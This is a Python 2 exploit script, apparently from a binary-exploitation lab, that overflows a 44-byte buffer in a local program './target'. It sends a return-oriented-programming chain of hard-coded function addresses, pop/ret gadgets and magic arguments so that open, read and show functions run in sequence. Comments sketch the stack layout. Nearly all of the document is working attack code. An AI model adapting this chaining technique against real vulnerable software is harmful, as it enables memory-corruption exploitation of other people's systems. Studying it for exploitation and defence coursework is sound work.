#!/usr/bin/env python2

import os
import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)   # < little-endian;  I unsigned int

def p64(n):
    return struct.pack("<Q", n)   # Q unsigned long long

def ps(n,s):
    return struct.pack(str(n)+'s', s)   # s  char[]

if __name__ == '__main__':

    # assert is used to check if binary is correct
    assert p32(0x12345678) == b'\x78\x56\x34\x12'                     # 4 bytes in m32 
    assert p64(0x12345678) == b'\x78\x56\x34\x12\x00\x00\x00\x00'     # 8 bytes in m64
    assert ps(4, 'aaaa') == b'\x61\x61\x61\x61'

    cmds = ["./target"]
    env = os.environ

    buf = ps(44,"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHAAAABBBBCCCC")

    OpenAddr = p32(0x0804847d)
    OpenArg1 = p32(0xdeadbeef)

    ReadAddr = p32(0x080484c1)
    ReadArg2 = p32(0x89abcdef)
    ReadArg1 = p32(0x01234567)

    ShowAddr = p32(0x08048512)

    PopOnce = p32(0x08048311)
    PopTwice = p32(0x080485ce)

    input = buf + OpenAddr + PopOnce + OpenArg1 + ReadAddr + PopTwice + ReadArg1 + ReadArg2 + ShowAddr

    p = sp.Popen(cmds, env=env, stdin=sp.PIPE, universal_newlines=False)
    p.communicate(input)
    p.wait()

#[buf      ]
#[.....    ]
#[old-ra   ] -> 1) func1
#[ra       ] ------------------> pop/ret gadget
#[old-arg1 ] -> 1) arg1
#[ra       ] -> func2
#[ra       ] ------------------> pop/pop/ret gadget
#[arg1     ] -> arg1
#[arg2     ] -> arg2
#[ra       ] ...

